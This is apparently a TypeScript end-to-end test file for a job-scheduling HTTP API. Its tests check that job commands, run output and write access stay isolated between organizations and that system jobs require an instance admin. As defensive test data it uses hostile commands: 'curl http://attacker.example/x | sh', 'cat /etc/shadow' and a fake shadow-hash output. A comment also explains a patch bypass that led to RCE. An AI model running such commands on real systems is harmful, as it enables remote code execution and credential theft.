/**
 * Jobs HTTP E2E — real router + real auth + real permission + real DB.
 *
 * Covers: auth rejection, custom-job create/list/get/delete, the write-side
 * server authorization, system-job immutability, and FIX #1 — command-job
 * config + run output are not readable across orgs (only server-admins of the
 * job's target servers; builtins stay member-visible).
 */
import { describe, it, expect, beforeAll, beforeEach, afterAll } from "vitest";
import { initPlatform, resetPlatform } from "@repo/adapters";
import { makeApp, seedOwner, seedServer, resetJobs, installFakeRunner, req, db, schema, repos } from "./_harness";

const app = makeApp();
const runner = installFakeRunner();

beforeAll(async () => {
  await initPlatform({ target: "selfhosted", runtime: "docker" });
});
afterAll(() => resetPlatform());
beforeEach(async () => {
  await resetJobs();
  runner.recurring.clear();
});

describe("jobs HTTP — auth + CRUD", () => {
  it("rejects unauthenticated requests", async () => {
    expect((await req(app, "GET", "/")).status).toBe(401);
    expect((await req(app, "POST", "/", { body: { label: "x", command: "true" } })).status).toBe(401);
  });

  it("owner creates a custom command job; it persists and is listed + readable", async () => {
    const o = await seedOwner();
    const server = await seedServer(o.orgId);
    const create = await req(app, "POST", "/", {
      auth: o.auth,
      body: { label: "deploy", command: "echo hi", serverIds: [server], scheduleType: "manual" },
    });
    expect(create.status).toBe(201);
    const key: string = create.body.data.key;
    expect(key).toMatch(/^custom:/);

    // persisted for real
    const row = await repos.job.findByKey(key);
    expect(row?.actionType).toBe("command");
    expect((row?.actionConfig as { command: string }).command).toBe("echo hi");

    // listed + individually readable by the owner
    const list = await req(app, "GET", "/", { auth: o.auth });
    expect(list.body.data.some((j: { key: string }) => j.key === key)).toBe(true);
    expect((await req(app, "GET", `/${key}`, { auth: o.auth })).status).toBe(200);
  });

  it("denies creating a command job pointed at a server outside the caller's org", async () => {
    const a = await seedOwner();
    const b = await seedOwner();
    const foreignServer = await seedServer(b.orgId);
    const res = await req(app, "POST", "/", {
      auth: a.auth,
      body: { label: "evil", command: "id", serverIds: [foreignServer], scheduleType: "manual" },
    });
    expect(res.status).toBe(404); // isServerInOrg=false → "Server not found"
    // nothing was created
    const list = await req(app, "GET", "/", { auth: a.auth });
    expect(list.body.data.length).toBe(0);
  });

  it("custom jobs are deletable; system jobs are not", async () => {
    const o = await seedOwner();
    const server = await seedServer(o.orgId);
    const key: string = (
      await req(app, "POST", "/", {
        auth: o.auth,
        body: { label: "tmp", command: "true", serverIds: [server], scheduleType: "manual" },
      })
    ).body.data.key;
    expect((await req(app, "DELETE", `/${key}`, { auth: o.auth })).status).toBe(200);
    expect(await repos.job.findByKey(key)).toBeNull();

    await seedSystemJob("test:builtin-del");
    expect((await req(app, "DELETE", "/test:builtin-del", { auth: o.auth })).status).toBeGreaterThanOrEqual(400);
    expect(await repos.job.findByKey("test:builtin-del")).not.toBeNull();
  });
});

describe("jobs HTTP — fix #1: cross-org read isolation", () => {
  it("a command job's config + run output are not readable across orgs", async () => {
    const a = await seedOwner();
    const b = await seedOwner();
    const serverA = await seedServer(a.orgId);
    const key: string = (
      await req(app, "POST", "/", {
        auth: a.auth,
        body: {
          label: "secret-job",
          command: "cat /etc/shadow",
          serverIds: [serverA],
          env: { TOKEN: "hunter2" },
          scheduleType: "manual",
        },
      })
    ).body.data.key;

    // a run with sensitive captured output
    const run = await repos.jobRun.start({ jobId: key, kind: "custom", trigger: "manual", serverId: serverA });
    await repos.jobRun.finish(run.id, {
      status: "success",
      durationMs: 1,
      summary: { exitCode: 0 },
      output: "root:$6$deadbeef",
    });

    // owner A (server admin of the target) sees everything
    expect((await req(app, "GET", `/${key}`, { auth: a.auth })).status).toBe(200);
    expect((await req(app, "GET", `/runs/${run.id}`, { auth: a.auth })).body.data.output).toContain("root:");
    expect((await req(app, "GET", `/${key}/runs`, { auth: a.auth })).status).toBe(200);
    expect((await req(app, "GET", "/", { auth: a.auth })).body.data.some((j: { key: string }) => j.key === key)).toBe(true);

    // owner B (different org, no access to serverA) is denied — 404, not existence-leaking
    expect((await req(app, "GET", `/${key}`, { auth: b.auth })).status).toBe(404);
    expect((await req(app, "GET", `/runs/${run.id}`, { auth: b.auth })).status).toBe(404);
    expect((await req(app, "GET", `/${key}/runs`, { auth: b.auth })).status).toBe(404);
    expect((await req(app, "GET", "/", { auth: b.auth })).body.data.some((j: { key: string }) => j.key === key)).toBe(false);
  });

  it("builtin/system jobs stay readable by any member (no server gate)", async () => {
    const a = await seedOwner();
    const b = await seedOwner();
    await seedSystemJob("test:builtin-read");
    for (const who of [a, b]) {
      expect((await req(app, "GET", "/test:builtin-read", { auth: who.auth })).status).toBe(200);
      expect(
        (await req(app, "GET", "/", { auth: who.auth })).body.data.some((j: { key: string }) => j.key === "test:builtin-read"),
      ).toBe(true);
    }
  });
});

describe("jobs HTTP — fix #2: cross-org write isolation", () => {
  /** Owner A's command job on Owner A's server. Returns its key + the server id. */
  async function seedForeignJob(a: { auth: Record<string, string>; orgId: string }) {
    const serverA = await seedServer(a.orgId);
    const key: string = (
      await req(app, "POST", "/", {
        auth: a.auth,
        body: { label: "nightly-backup", command: "echo hi", serverIds: [serverA], scheduleType: "manual" },
      })
    ).body.data.key;
    return { key, serverA };
  }

  const storedCommand = async (key: string) =>
    ((await repos.job.findByKey(key))?.actionConfig as { command?: string } | null)?.command;

  it("a patch that OMITS serverIds cannot rewrite another org's command", async () => {
    // The bypass: the gate only looked at servers named in the BODY, while the
    // update is a merge — so omitting serverIds left the stored targets in place
    // and wrote the attacker's command onto them. Next tick = RCE as the SSH user.
    const a = await seedOwner();
    const b = await seedOwner();
    const { key } = await seedForeignJob(a);

    const res = await req(app, "PATCH", `/${key}`, {
      auth: b.auth,
      body: { command: "curl http://attacker.example/x | sh" },
    });

    expect(res.status).toBe(404);
    expect(await storedCommand(key)).toBe("echo hi");
  });

  it("naming the server in the patch is refused too (the case that already worked)", async () => {
    const a = await seedOwner();
    const b = await seedOwner();
    const { key, serverA } = await seedForeignJob(a);

    const res = await req(app, "PATCH", `/${key}`, {
      auth: b.auth,
      body: { serverIds: [serverA], command: "id" },
    });

    expect(res.status).toBe(404);
    expect(await storedCommand(key)).toBe("echo hi");
  });

  it("another org cannot silently disable a job", async () => {
    // Invisible to the victim: a disabled backup job looks like a job that simply
    // hasn't run yet.
    const a = await seedOwner();
    const b = await seedOwner();
    const { key } = await seedForeignJob(a);

    expect((await req(app, "PATCH", `/${key}`, { auth: b.auth, body: { enabled: false } })).status).toBe(404);
    expect((await repos.job.findByKey(key))?.enabled).toBe(true);
  });

  it("another org cannot delete a job", async () => {
    const a = await seedOwner();
    const b = await seedOwner();
    const { key } = await seedForeignJob(a);

    expect((await req(app, "DELETE", `/${key}`, { auth: b.auth })).status).toBe(404);
    expect(await repos.job.findByKey(key)).not.toBeNull();
  });

  it("the key alone is not authorization — B never has to be able to READ the job", async () => {
    // The reads were already gated, so an attacker holding a guessed/leaked key is
    // exactly the case the write gate has to stop on its own.
    const a = await seedOwner();
    const b = await seedOwner();
    const { key } = await seedForeignJob(a);

    expect((await req(app, "GET", `/${key}`, { auth: b.auth })).status).toBe(404);
    expect((await req(app, "POST", `/${key}/run`, { auth: b.auth })).status).toBe(404);
    expect((await req(app, "PATCH", `/${key}`, { auth: b.auth, body: { label: "renamed" } })).status).toBe(404);
    expect((await repos.job.findByKey(key))?.label).toBe("nightly-backup");
  });

  it("a write denial is indistinguishable from an unknown key, and never echoes the target server id", async () => {
    // `permission.assert` throws NotFoundError("server", id), so replying with the
    // target check's own message would tell an unauthorized caller both that the key
    // exists and which server it runs on — the two facts the read gate 404s to hide.
    const a = await seedOwner();
    const b = await seedOwner();
    const { key, serverA } = await seedForeignJob(a);

    const foreign = await req(app, "PATCH", `/${key}`, { auth: b.auth, body: { command: "id" } });
    const unknown = await req(app, "PATCH", "/custom:does-not-exist", { auth: b.auth, body: { command: "id" } });
    expect(foreign.status).toBe(unknown.status);
    expect(foreign.body).toEqual(unknown.body);
    expect(JSON.stringify(foreign.body)).not.toContain(serverA);

    const delForeign = await req(app, "DELETE", `/${key}`, { auth: b.auth });
    const runForeign = await req(app, "POST", `/${key}/run`, { auth: b.auth });
    for (const res of [delForeign, runForeign]) {
      expect(res.status).toBe(404);
      expect(JSON.stringify(res.body)).not.toContain(serverA);
    }
  });

  it("the gate is not too wide: the owning org still edits, runs and deletes its own job", async () => {
    const a = await seedOwner();
    const { key } = await seedForeignJob(a);

    const patch = await req(app, "PATCH", `/${key}`, {
      auth: a.auth,
      body: { command: "echo updated", enabled: false },
    });
    expect(patch.status).toBe(200);
    expect(await storedCommand(key)).toBe("echo updated");
    expect((await repos.job.findByKey(key))?.enabled).toBe(false);

    expect((await req(app, "DELETE", `/${key}`, { auth: a.auth })).status).toBe(200);
    expect(await repos.job.findByKey(key)).toBeNull();
  });

  it("only an instance admin can mutate or run an instance-wide system job", async () => {
    // Every ordinary user owns a personal org, so an org-owner check is not an
    // instance boundary. Reproduce the advisory's encoded dispatcher route.
    const orgOwner = await seedOwner();
    const victim = await seedOwner();
    const instanceAdmin = await seedOwner({ instanceAdmin: true });
    const victimServer = await seedServer(victim.orgId);
    const victimJob = "custom:victim-once";
    const now = new Date();
    await db.insert(schema.job).values({
      id: "job_victim_once",
      key: victimJob,
      kind: "custom",
      label: "Victim once",
      scheduleType: "once",
      runAt: new Date(Date.now() - 60_000),
      enabled: true,
      actionType: "command",
      actionConfig: { serverIds: [victimServer], command: "true" },
      createdBy: victim.userId,
      createdAt: now,
      updatedAt: now,
    });
    await seedSystemJob("jobs:oneshot");

    const deniedRun = await req(app, "POST", "/jobs%3Aoneshot/run", {
      auth: orgOwner.auth,
    });
    expect(deniedRun.status).toBe(403);
    expect(deniedRun.body.code).toBe("FORBIDDEN");
    expect(deniedRun.body.error).toBe("Requires an instance administrator");
    expect(await repos.jobRun.listRecent({ jobId: "jobs:oneshot" })).toEqual([]);
    expect(await repos.jobRun.listRecent({ jobId: victimJob })).toEqual([]);
    expect(await repos.job.findByKey(victimJob)).toMatchObject({
      enabled: true,
      runAt: expect.any(Date),
    });

    const deniedPatch = await req(app, "PATCH", "/jobs%3Aoneshot", {
      auth: orgOwner.auth,
      body: { enabled: false },
    });
    expect(deniedPatch.status).toBe(403);
    expect((await repos.job.findByKey("jobs:oneshot"))?.enabled).toBe(true);

    // Keep the positive instance-admin case independent of the denied victim.
    await repos.job.remove(victimJob);

    const allowedRun = await req(app, "POST", "/jobs%3Aoneshot/run", {
      auth: instanceAdmin.auth,
    });
    expect(allowedRun.status).toBe(200);
    expect(allowedRun.body.data).toMatchObject({
      key: "jobs:oneshot",
      summary: { fired: 0 },
    });

    expect(
      (
        await req(app, "PATCH", "/jobs%3Aoneshot", {
          auth: instanceAdmin.auth,
          body: { enabled: false },
        })
      ).status,
    ).toBe(200);
    expect((await repos.job.findByKey("jobs:oneshot"))?.enabled).toBe(false);
  });

  it("self-heals a missing registered system job and keeps one row + schedule", async () => {
    const instanceAdmin = await seedOwner({ instanceAdmin: true });
    const path = "/services%3Ahealth-watch";

    // Exercise the same boot/request race that produced `Job not found`: both
    // requests see no row and converge through the registry-backed upsert.
    const results = await Promise.all([
      req(app, "PATCH", path, { auth: instanceAdmin.auth, body: { enabled: true } }),
      req(app, "PATCH", path, { auth: instanceAdmin.auth, body: { enabled: true } }),
    ]);
    expect(results.map((result) => result.status)).toEqual([200, 200]);

    const matchingRows = (await repos.job.listAll()).filter(
      (row) => row.key === "services:health-watch",
    );
    expect(matchingRows).toHaveLength(1);
    expect(matchingRows[0]).toMatchObject({
      kind: "system",
      actionType: "builtin",
      label: "Container health watch",
      cronExpression: "* * * * *",
      enabled: true,
    });
    expect([...runner.recurring.keys()].filter((key) => key === "services:health-watch")).toHaveLength(1);

    // A later click is idempotent too: no second definition and no second timer.
    expect((await req(app, "PATCH", path, {
      auth: instanceAdmin.auth,
      body: { enabled: true },
    })).status).toBe(200);
    expect((await repos.job.listAll()).filter((row) => row.key === "services:health-watch")).toHaveLength(1);
    expect([...runner.recurring.keys()].filter((key) => key === "services:health-watch")).toHaveLength(1);

    // The registration is the registry's real health-watch callback, wrapped by
    // the normal job-run recorder—not a second Health-tab implementation.
    await runner.tick("services:health-watch");
    expect(await repos.jobRun.listRecent({ jobId: "services:health-watch", limit: 5 })).toMatchObject([
      { status: "success", trigger: "schedule", kind: "system" },
    ]);
  });

  it("authorizes a missing registered system job before creating it", async () => {
    const orgOwner = await seedOwner();
    const denied = await req(app, "PATCH", "/services%3Ahealth-watch", {
      auth: orgOwner.auth,
      body: { enabled: true },
    });

    expect(denied.status).toBe(403);
    expect(denied.body.error).toBe("Requires an instance administrator");
    expect(await repos.job.findByKey("services:health-watch")).toBeNull();
    expect(runner.recurring.has("services:health-watch")).toBe(false);
  });

  it("keeps operator settings when concurrent system-job ensures converge", async () => {
    const definition = {
      key: "services:health-watch",
      label: "Container health watch",
      defaultCron: "* * * * *",
    };
    await repos.job.upsertSystem(definition);
    await repos.job.update(definition.key, {
      enabled: false,
      cronExpression: "*/7 * * * *",
    });

    await Promise.all([
      repos.job.upsertSystem(definition),
      repos.job.upsertSystem(definition),
      repos.job.upsertSystem(definition),
    ]);

    expect((await repos.job.listAll()).filter((row) => row.key === definition.key)).toHaveLength(1);
    expect(await repos.job.findByKey(definition.key)).toMatchObject({
      enabled: false,
      cronExpression: "*/7 * * * *",
    });
  });

  it("an unknown key is 404 on both write verbs", async () => {
    const a = await seedOwner();
    expect((await req(app, "PATCH", "/custom:nope", { auth: a.auth, body: { enabled: false } })).status).toBe(404);
    expect((await req(app, "DELETE", "/custom:nope", { auth: a.auth })).status).toBe(404);
  });
});

/** Seed a builtin/system job row directly (reconcileJobs seeds these at boot). */
async function seedSystemJob(key: string) {
  const now = new Date();
  await db.insert(schema.job).values({
    id: `job_${key.replace(/[^a-z0-9]/gi, "_")}`,
    key,
    kind: "system",
    label: "System job",
    cronExpression: "0 3 * * *",
    scheduleType: "recurring",
    enabled: true,
    actionType: "builtin",
    dependsOn: [],
    triggerEvents: [],
    createdAt: now,
    updatedAt: now,
  });
}
